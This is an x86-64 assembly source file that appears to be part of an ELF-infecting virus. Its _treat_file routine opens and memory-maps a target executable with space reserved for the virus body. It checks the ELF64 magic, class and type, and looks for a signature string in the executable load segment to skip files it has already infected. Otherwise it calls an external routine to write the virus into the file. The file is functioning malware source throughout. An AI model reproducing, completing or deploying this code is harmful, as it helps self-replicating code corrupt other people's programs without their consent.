section .text
	global _treat_file
	global _final_end
	extern _update_mmaped_file
	extern _string

_file_size:
	enter 24, 0
	xor rax, rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, 8
	mov rsi, 0
	mov rdx, 2
	syscall
	mov QWORD [rsp], rax
	mov rax, 8
	mov rsi, 0
	mov rdx, 0
	syscall
	mov rax, QWORD [rsp]
	leave
	ret

_treat_file:
	enter 80, 0 ; equal to push rbp - mov rbp, rsp - sub rsp, 16
				; rsp + 0 bytes for fd
				; rsp + 8 bytes for virus size
				; rsp + 16 bytes for file size
				; rsp + 24 bytes for mmap return address
				; rsp + 32 phdr
				; rsp + 40 actual phnum
				; rsp + 48 ehdr->e_phnum
				; rsp + 56 supposed string of file
	cmp rdi, 0
	je _final_end
	mov QWORD [rsp + 8], rsi
;;;;;;;;;;;;;;;;;
; open file
	mov rax, 2
	mov rsi, 2
	xor rdx, rdx
	syscall
	cmp rax, -1
	jle _final_end
	mov QWORD [rsp], rax ; store the fd
	mov rdi, rax
	call _file_size
	mov QWORD [rsp + 16], rax ; store file size
;;;;;;;;;;;;;;;;;
; mmap file
	mov rax, 9
	mov rdi, 0
	mov rsi, QWORD [rsp + 16]
	add rsi, QWORD [rsp + 8]
	add rsi, 8
	mov rdx, 3
	mov r10, 2
	mov r8, QWORD [rsp]
	mov r9, 0
	syscall
	cmp rax, 0
	jle _final_end
	mov QWORD [rsp + 24], rax

_read_file_header_64:
;;;;;;;;;;;;;;;;;
; read the header from file, if it has one (64 bytes)
;	xor rax, rax
;	mov rdi, QWORD [rsp + 4096]
;	mov rsi, rsp
;	mov rdx, 64
;	syscall
;	cmp rax, 64  ; if their is less than 64 bytes readed, then the file is not a binary
;	jl _final_end
;; check magic number
	mov rdi, [rsp + 24]
	cmp DWORD [rdi], 0x464c457f
	jne _final_end
;; check class file (only 64 bits are treated)
	cmp BYTE [rdi + 4], 2
	jne _final_end
;; check the file type, only exec files are treated
	cmp WORD [rdi + 16], 2
	jne _final_end
;; check if our string is already in the file.
	mov r10, QWORD [rsp + 24]
	mov QWORD [rsp + 32], r10
	add QWORD [rsp + 32], 32
	mov r10, QWORD [rsp + 32]
	mov r10, QWORD [r10]
	mov QWORD [rsp + 32], r10
	mov r10, QWORD [rsp + 24]
	add QWORD [rsp + 32], r10
	mov QWORD [rsp + 40], 0
	mov r10, QWORD [rsp + 24]
	mov QWORD [rsp + 48], r10
	add QWORD [rsp + 48], 56
	mov r11, QWORD [rsp + 48]
	xor r10, r10
	mov r10w, WORD [r11]
;	mov r10w, WORD [r11]
	mov QWORD [rsp + 48], r10

_loop_verif:
	mov r10, QWORD [rsp + 40]
	cmp r10, QWORD [rsp + 48]
	jge _final_end
	mov r10, QWORD [rsp + 32]
	cmp DWORD [r10], 1
	jne _inc_before_reloop
	add r10, 4
	mov r10d, DWORD [r10]
	and r10d, 1
	cmp r10d, 1
	jne _inc_before_reloop
; we find pt_load
	mov r10, QWORD [rsp + 32]
	add r10, 8
	mov r10, QWORD [r10]
	mov QWORD [rsp + 56], r10
	mov r10, QWORD [rsp + 32]
	add r10, 32
	mov r10, QWORD [r10]
	add QWORD [rsp + 56], r10
	mov r10, QWORD [rsp + 8]
	sub QWORD [rsp + 56], r10
	mov r10, QWORD [rsp + 24]
	add QWORD [rsp + 56], r10
	jmp _init_cmp_loop

_inc_before_reloop:
	add QWORD [rsp + 32], 56
	inc QWORD [rsp + 40]
	jmp _loop_verif

_init_cmp_loop:
	xor rcx, rcx
	mov rdi, QWORD [rsp + 56]
	lea rsi, [rel _string]

_cmp:
	cmp rcx, 48
	jge _munmap
	mov r10, QWORD [rsi + rcx]
	cmp r10, QWORD [rdi + rcx]
	jne _call_mmaped_update
	add rcx, 8
	jmp _cmp

_call_mmaped_update:
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 16]
	add rsi, QWORD [rsp + 8]
	add rsi, 8
	mov rdx, QWORD [rsp + 8]
	mov r10, QWORD [rsp]
	call _update_mmaped_file

;;;;;;;;;;;;;;;;;;;;;;;;
;; just print string for debug, will not appear in final version
;	push 0x000a6b6f
;	mov rax, 1
;	mov rdi, 1
;	mov rsi, rsp
;	mov rdx, 3
;	syscall
;	pop rdi
;;;;;;;;;;;;;;;;;;;;;;;;
; munmap
_munmap:
	mov rax, 11
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 16]
	add rsi, QWORD [rsp + 8]
	add rsi, 8
	syscall
;;;;;;;;;;;;;;;;;;;;;;;;
; close file
	mov rax, 3
	mov rdi, QWORD [rsp]
	syscall

_final_end:
	leave
	ret
